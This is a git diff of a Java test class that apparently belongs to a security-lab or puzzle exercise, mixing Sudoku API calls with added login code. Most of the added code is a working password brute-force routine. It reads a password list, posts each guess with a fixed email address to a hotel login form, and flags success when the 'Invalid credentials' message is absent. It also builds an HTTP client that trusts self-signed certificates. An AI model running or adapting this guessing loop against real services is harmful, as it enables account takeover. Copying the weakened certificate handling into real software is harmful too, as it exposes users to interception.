@@ -1,9 +1,23 @@
 package net;
 
 import file.FileUtil;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.methods.CloseableHttpResponse;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
+import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
+import org.apache.http.entity.ContentType;
+import org.apache.http.entity.StringEntity;
+import org.apache.http.impl.client.CloseableHttpClient;
+import org.apache.http.impl.client.HttpClients;
+import org.apache.http.ssl.SSLContextBuilder;
+import org.apache.http.util.EntityUtils;
 import org.junit.Test;
 
 import java.io.IOException;
+import java.security.KeyManagementException;
+import java.security.KeyStoreException;
+import java.security.NoSuchAlgorithmException;
 import java.util.HashMap;
 import java.util.List;
 import java.util.concurrent.*;
@@ -225,10 +239,7 @@ public class HttpUtilTest {
 
         private String getBlock(String sudokuId, int row, int col, char[][] board) {
             HttpUtil httpUtil = new HttpUtil();
-
             String block = httpUtil.sendRequest("http://svetoku.xsec.sap.corp:8888/api/svetoku/puzzles/" + sudokuId + "/blocks/" + row + "/" + col, "Get", new HashMap<>(), new HashMap<>(), HttpUtil.PARAMETER_TYPE_URLENCODED);
-
-
             System.out.println(row + ", " + col + ":" + System.currentTimeMillis());
             return block;
         }
@@ -240,7 +251,7 @@ public class HttpUtilTest {
         List<String> passwords = FileUtil.readTxtFileIntoStringArrList("test1.txt");
         for (String password : passwords) {
             try {
-                if (!HttpUtil.sendLoginInfo(password)) {
+                if (!sendLoginInfo(password)) {
                     System.out.println("found!" + password);
                     break;
                 }
@@ -257,5 +268,37 @@ public class HttpUtilTest {
         String url = "https://raw.githubusercontent.com/shawntns/top-100-worst-passwords/master/dic.txt";
         String s = httpUtil.sendRequest(url,"Get",new HashMap(),new HashMap(), HttpUtil.PARAMETER_TYPE_URLENCODED);
         System.out.println(s);
+    }
+
+    private static Boolean sendLoginInfo(String password) throws KeyManagementException, NoSuchAlgorithmException {
+        HttpPost post = new HttpPost("https://hotel.example.com/");
+        String  bodyStr = "email=lnorris%40bonvoyage.com&password="+password;
+        StringEntity bodyEntity = new StringEntity(bodyStr, ContentType.APPLICATION_FORM_URLENCODED);
+        post.setEntity(bodyEntity);
+        long startTime=System.currentTimeMillis();
+        SSLContextBuilder builder = new SSLContextBuilder();
+        try {
+            builder.loadTrustMaterial(null, new TrustSelfSignedStrategy());
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        } catch (KeyStoreException e) {
+            e.printStackTrace();
+        }
+        SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(
+                builder.build());
+
+        try (CloseableHttpClient httpClient = HttpClients.custom().setSSLSocketFactory(
+                sslsf).build();//HttpClients.createDefault();
+             CloseableHttpResponse response = httpClient.execute(post)) {
+            System.out.println("executionTime:"+(System.currentTimeMillis()-startTime)+"ms");
+            String responseStr = EntityUtils.toString(response.getEntity());
+            return responseStr.contains("Invalid credentials");
+        } catch (ClientProtocolException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println("Exception when checking password:"+password);
+        return null;
     }
 }
